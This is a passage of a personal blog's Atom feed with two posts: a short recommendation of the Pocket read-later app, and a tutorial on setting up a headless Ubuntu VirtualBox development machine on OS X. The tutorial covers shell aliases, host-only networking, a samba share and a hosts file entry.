    <content type="html"><![CDATA[<p>Whenever I set up a new device the first thing I download onto it is <a href="https://getpocket.com">Pocket</a>. This app is seriously handy for tech people and adding it to Flipboard just takes it to another level. My primary use for Pocket is to help me keep up with the technology scene. The landscape changes on a daily basis, there is always some new trending language, an update to some framework or some cool device. Normally each day during some down time, I will flip through my feeds and skim through articles that catch my eye. Sometimes I can&rsquo;t finish the article, sometimes it is a tutorial for something I want to do, and other times it&rsquo;s something I might want to share. With Pocket, a simple click of a button solves all of this and more. You can store, share, tag, synchronize and much more.</p>

<!--more-->


<p>Probably the best feature of pocket is the offline storage and tagging. I use this in my development workflow to store and index tutorials relating to my current project. Some of you may not have this problem, but browser tab hoarding is a real issue for me. So when I find something beneficial instead of leaving it up in a tab the entire time I save it to pocket and tag it for later use. No more shooting myself in the foot searching my browsing history for the site. Anyways, I just wanted to share this nifty app and how it has saved me hours of my time. If you are not already using Pocket and you are in technology, do yourself a favor and get it today.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Setting Up a Separate Development Environment in OS X]]></title>
    <link href="http://elauqsap.github.io/blog/2015/02/14/setting-up-a-separate-development-environment-in-os-x/"/>
    <updated>2015-02-14T01:30:39-06:00</updated>
    <id>http://elauqsap.github.io/blog/2015/02/14/setting-up-a-separate-development-environment-in-os-x</id>
    <content type="html"><![CDATA[<p>I like to keep my development environment separate from my host environment on my personal laptop. A simple solution for keeping them apart is to set up a headless virtual machine with a samba share. I like this method the most because you can set up a lightweight server that can easily load your code base into your favorite IDE or text editor. I will be using VirtualBox in this example but you can use Fusion as well, it just requires a different command.</p>

<!--more-->


<h4>Prerequisites</h4>

<ol>
<li>Download VirtualBox from <a href="https://www.virtualbox.org/wiki/Downloads">here</a></li>
<li>Download Ubuntu Server (14.04 LTS in this example) from <a href="http://www.ubuntu.com/download/server">here</a></li>
</ol>


<p>First, I am going to setup my dotfiles to include a few aliases for interacting with the virtual machine. In your shell configuration file (zsh here) add the equivalent aliases so you can quickly start, mount, and remote into the server. Remember to replace $USER with whatever uid name you will be using on the guest server. Also $GUEST needs to be changed to whatever you call the virtual machine.</p>

<figure class='code'><figcaption><span>.zshrc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Ubuntu devbox aliases</span>
</span><span class='line'><span class="nb">alias </span><span class="nv">devbox</span><span class="o">=</span><span class="s1">&#39;VBoxManage startvm &quot;$GUEST&quot; --type headless&#39;</span>
</span><span class='line'><span class="nb">alias </span><span class="nv">sshdev</span><span class="o">=</span><span class="s1">&#39;ssh devbox&#39;</span>
</span><span class='line'><span class="nb">alias </span><span class="nv">mountdev</span><span class="o">=</span><span class="s1">&#39;mount_smbfs //devbox/$USER ~/devbox&#39;</span>
</span><span class='line'><span class="nb">alias </span><span class="nv">umountdev</span><span class="o">=</span><span class="s1">&#39;umount ~/devbox&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>After you have VirtualBox installed go ahead and create a new Virtual Machine. I carved off 2048 MB in RAM and 20 GB in storage for the development box. You should now have a basic virtual machine, but before you can boot it up we need to take care of a few things. First, create a Host-Only network that we will later attach as the second adapter (VirtualBox -> Preferences -> Network -> Host-only Networks). If &ldquo;vboxnet0&rdquo; is not already there, click the add button and then edit. Configuration listed below.</p>

<pre><code># Adapter
IPv4 Address: 10.10.1.1
IPv4 Network Mask: 255.255.255.248
IPv6 Address:
IPv6 Network Mask Length: 0
</code></pre>

<hr />

<pre><code># DHCP Server
Uncheck Enable Server
</code></pre>

<p>Close out of VirtualBox&rsquo;s settings and highlight the virtual machine we created. We need to attach the ISO we downloaded earlier to the IDE Controller (Settings -> Storage). Once you have added the ISO to empty IDE slot we are going to switch to the Networking tab to setup our interfaces. The first adapter should be set to NAT. If it is not selected go to the drop down for &ldquo;Attached to:&rdquo; and add it. Flip into the second adapter and set it to be Host-only. We are done configuring the virtual machine, go ahead and boot the server and follow the basic install instructions. With Ubuntu, you can choose to install Samba and Open SSH Server during the installation process so that kills two birds with one stone for us.</p>

<p>Once the installation is complete and the server reboots, we need to modify two files on the system. The first file I have listed below is your interfaces file. The first adapter &ldquo;eth0&rdquo; will be your NAT so the host can communicate outbound to receive packages. Leave this interface configured for DHCP. The second adapter &ldquo;eth1&rdquo; is on our Host-Only network and needs a static address. This network allows the host system to connect to any of the public facing services on the headless virtual machine (SSH, Web Server, MongoDB, etc).</p>

<figure class='code'><figcaption><span>/etc/network/interfaces</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># This file describes the network interfaces available on your system</span>
</span><span class='line'><span class="c"># and how to activate them. For more information, see interfaces(5).</span>
</span><span class='line'>
</span><span class='line'><span class="c"># The loopback network interface</span>
</span><span class='line'>auto lo
</span><span class='line'>iface lo inet loopback
</span><span class='line'>
</span><span class='line'><span class="c"># The primary network interface</span>
</span><span class='line'>auto eth0
</span><span class='line'>iface eth0 inet dhcp
</span><span class='line'>
</span><span class='line'><span class="c"># Host-only interface</span>
</span><span class='line'>auto eth1
</span><span class='line'>iface eth1 inet static
</span><span class='line'>  address     10.10.1.2
</span><span class='line'>  netmask     255.255.255.248
</span><span class='line'>  network     10.10.1.0
</span><span class='line'>  broadcast   10.10.1.7
</span></code></pre></td></tr></table></div></figure>


<p>The second file is our samba share configuration that will let you mount the home directory of the guest user. This is where you will store your code base and anything else related to the application. Once you mount it on your host system you can open the project up in your favorite IDE or text editor and begin working. Just remember to save often and unmount the share before shutting down the virtual machine.</p>

<figure class='code'><figcaption><span>/etc/samba/smb.conf</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>dev<span class="o">]</span>
</span><span class='line'>  <span class="nv">comment</span> <span class="o">=</span> <span class="nv">$USER</span>
</span><span class='line'>  <span class="nv">path</span> <span class="o">=</span> /home/<span class="nv">$USER</span>
</span><span class='line'>  guest <span class="nv">ok</span> <span class="o">=</span> no
</span><span class='line'>  <span class="nv">browseable</span> <span class="o">=</span> no
</span><span class='line'>  <span class="nv">writeable</span> <span class="o">=</span> yes
</span><span class='line'>  create <span class="nv">mask</span> <span class="o">=</span> 0600
</span><span class='line'>  directory <span class="nv">mask</span> <span class="o">=</span> 0700
</span></code></pre></td></tr></table></div></figure>


<p>On your OS X system, edit your hosts file to include an entry for your virtual machine. This way you can address it by a friendly host name rather than an IP address.</p>

<figure class='code'><figcaption><span>/etc/hosts</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>127.0.0.1   localhost
</span><span class='line'>255.255.255.255 broadcasthost
</span><span class='line'>::1             localhost
</span><span class='line'>fe80::1%lo0 localhost
</span><span class='line'>
</span><span class='line'><span class="c"># VirtualBox Hosts</span>
</span><span class='line'>10.10.1.2       devbox
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it! Now you can easily start, mount, and control your virtual machine all from your host system. Just enter &ldquo;devbox&rdquo; or whatever alias you changed it to and the virtual machine will boot up in headless mode.</p>
]]></content>
  </entry>
  
</feed>
